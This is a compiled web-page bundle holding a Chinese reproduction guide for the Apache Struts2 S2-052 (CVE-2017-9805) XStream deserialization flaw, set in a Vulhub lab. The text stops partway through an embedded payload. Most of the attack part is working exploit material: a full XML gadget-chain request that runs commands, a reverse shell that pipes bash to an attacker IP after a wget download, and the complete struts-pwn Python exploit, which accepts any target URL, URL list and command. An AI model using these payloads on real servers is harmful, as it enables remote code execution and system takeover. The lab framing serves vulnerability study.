import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as p,c as o,a as n,b as a,d as t,e}from"./app-58e4a7d6.js";const c={},r=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p><table><thead><tr><th>扩展名</th><th>Content-Type</th><th>解析方法</th></tr></thead><tbody><tr><td>xml</td><td>application/xml</td><td>xstream</td></tr><tr><td>json</td><td>application/json</td><td>jsonlib或jackson(可选)</td></tr><tr><td>xhtml</td><td>application/xhtml+xml</td><td>无</td></tr><tr><td>无</td><td>application/x-www-form-urlencoded</td><td>无</td></tr><tr><td>无</td><td>multipart/form-data</td><td>无</td></tr></tbody></table><p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;classname&gt;&lt;/classname&gt;
//或者
&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget。</p><p>漏洞详情:</p>`,7),u={href:"http://struts.apache.org/docs/s2-052.html",target:"_blank",rel:"noopener noreferrer"},d={href:"https://yq.aliyun.com/articles/197926",target:"_blank",rel:"noopener noreferrer"},v=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-052测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动环境后，访问<code>http://your-ip:8080/orders.xhtml</code>即可看到showcase页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>由于rest-plugin会根据URI扩展名或Content-Type来判断解析方法，所以我们只需要修改orders.xhtml为orders.xml或修改Content-Type头为application/xml，即可在Body中传递XML数据。</p><p>所以，最后发送的数据包为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /orders/3/edit HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/xml
Content-Length: 2415

&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
                &lt;initialized&gt;false&lt;/initialized&gt;
                &lt;opmode&gt;0&lt;/opmode&gt;
                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
                      &lt;command&gt;
                        &lt;string&gt;touch&lt;/string&gt;
                        &lt;string&gt;/tmp/awesome_poc&lt;/string&gt;
                      &lt;/command&gt;
                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
                    &lt;/next&gt;
                  &lt;/iter&gt;
                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
                    &lt;method&gt;
                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
                      &lt;name&gt;start&lt;/name&gt;
                      &lt;parameter-types/&gt;
                    &lt;/method&gt;
                    &lt;name&gt;foo&lt;/name&gt;
                  &lt;/filter&gt;
                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
                &lt;/serviceIterator&gt;
                &lt;lock/&gt;
              &lt;/cipher&gt;
              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
              &lt;ibuffer&gt;&lt;/ibuffer&gt;
              &lt;done&gt;false&lt;/done&gt;
              &lt;ostart&gt;0&lt;/ostart&gt;
              &lt;ofinish&gt;0&lt;/ofinish&gt;
              &lt;closed&gt;false&lt;/closed&gt;
            &lt;/is&gt;
            &lt;consumed&gt;false&lt;/consumed&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
&lt;/map&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>以上数据包成功执行的话，会在docker容器内创建文件<code>/tmp/awesome_poc</code>，执行<code>docker-compose exec struts2 ls /tmp/</code>即可看到。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021315609.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
        &lt;command&gt;
            &lt;string&gt;wget&lt;/string&gt;
            &lt;string&gt;192.168.174.128/shell.sh&lt;/string&gt;
        &lt;/command&gt;
        &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
    &lt;/next&gt;
&lt;/iter&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
        &lt;command&gt;
            &lt;string&gt;bash&lt;/string&gt;
            &lt;string&gt;shell.sh&lt;/string&gt;
        &lt;/command&gt;
        &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
    &lt;/next&gt;
&lt;/iter&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021317286.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment"># coding=utf-8</span>
<span class="token comment"># *****************************************************</span>
<span class="token comment"># struts-pwn: Apache Struts CVE-2017-9805 Exploit</span>
<span class="token comment"># Author:</span>
<span class="token comment"># Mazin Ahmed &lt;Mazin AT MazinAhmed DOT net&gt;</span>
<span class="token comment"># This code is based on:</span>
<span class="token comment"># https://github.com/rapid7/metasploit-framework/pull/8924</span>
<span class="token comment"># https://techblog.mediaservice.net/2017/09/detection-payload-for-the-new-struts-rest-vulnerability-cve-2017-9805/</span>
<span class="token comment"># *****************************************************</span>
<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span>
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token comment"># Disable SSL warnings</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] CVE: 2017-9805 - Apache Struts2 S2-052&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Struts-PWN - @mazen160&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\n%s -h for help.&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Check a single URL.&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-l&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--list&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;usedlist&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Check a list of URLs.&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--cmd&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;cmd&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Command to execute. (Default: &#39;echo test &gt; /tmp/struts-pwn&#39;)&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">,</span>
                    default<span class="token operator">=</span><span class="token string">&#39;echo test &gt; /tmp/struts-pwn&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--exploit&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;do_exploit&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Exploit.&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> args<span class="token punctuation">.</span>url <span class="token keyword">if</span> args<span class="token punctuation">.</span>url <span class="token keyword">else</span> <span class="token boolean">None</span>
usedlist <span class="token operator">=</span> args<span class="token punctuation">.</span>usedlist <span class="token keyword">if</span> args<span class="token punctuation">.</span>usedlist <span class="token keyword">else</span> <span class="token boolean">None</span>
url <span class="token operator">=</span> args<span class="token punctuation">.</span>url <span class="token keyword">if</span> args<span class="token punctuation">.</span>url <span class="token keyword">else</span> <span class="token boolean">None</span>
cmd <span class="token operator">=</span> args<span class="token punctuation">.</span>cmd <span class="token keyword">if</span> args<span class="token punctuation">.</span>cmd <span class="token keyword">else</span> <span class="token boolean">None</span>
do_exploit <span class="token operator">=</span> args<span class="token punctuation">.</span>do_exploit <span class="token keyword">if</span> args<span class="token punctuation">.</span>do_exploit <span class="token keyword">else</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">url_prepare</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;#&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%23&#39;</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%20&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> dont_print_status_on_console<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url_prepare<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">if</span> dont_print_status_on_console <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\n[*] URL: %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] CMD: %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cmd <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;&lt;string&gt;{0}&lt;/string&gt;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> cmd<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
                &lt;initialized&gt;false&lt;/initialized&gt;
                &lt;opmode&gt;0&lt;/opmode&gt;
                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
                      &lt;command&gt;
                        {0}
                      &lt;/command&gt;
                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
                    &lt;/next&gt;
                  &lt;/iter&gt;
                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
                    &lt;method&gt;
                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
                      &lt;name&gt;start&lt;/name&gt;
                      &lt;parameter-types/&gt;
                    &lt;/method&gt;
                    &lt;name&gt;foo&lt;/name&gt;
                  &lt;/filter&gt;
                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
                &lt;/serviceIterator&gt;
                &lt;lock/&gt;
              &lt;/cipher&gt;
              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
              &lt;ibuffer/&gt;
              &lt;done&gt;false&lt;/done&gt;
              &lt;ostart&gt;0&lt;/ostart&gt;
              &lt;ofinish&gt;0&lt;/ofinish&gt;
              &lt;closed&gt;false&lt;/closed&gt;
            &lt;/is&gt;
            &lt;consumed&gt;false&lt;/consumed&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
&lt;/map&gt;
&quot;&quot;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>

    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2017-9805)&#39;</span><span class="token punctuation">,</span>
        <span class="token comment"># &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&#39;,</span>
        <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/xml&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*/*&#39;</span>
    <span class="token punctuation">}</span>

    timeout <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        output <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;EXCEPTION::::--&gt; &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        output <span class="token operator">=</span> <span class="token string">&#39;ERROR&#39;</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url_prepare<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\n[*] URL: %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>

    initial_request <span class="token operator">=</span> exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> dont_print_status_on_console<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> initial_request <span class="token operator">==</span> <span class="token string">&quot;ERROR&quot;</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token boolean">False</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;The host does not respond as expected.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

    payload_sleep_based_10seconds <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
                &lt;initialized&gt;false&lt;/initialized&gt;
                &lt;opmode&gt;0&lt;/opmode&gt;
                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
                    &lt;next class=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot; serialization=&quot;custom&quot;&gt;
                      &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
                        &lt;default&gt;
                          &lt;__name&gt;Pwnr&lt;/__name&gt;
                          &lt;__bytecodes&gt;
                            &lt;byte-array&gt;yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
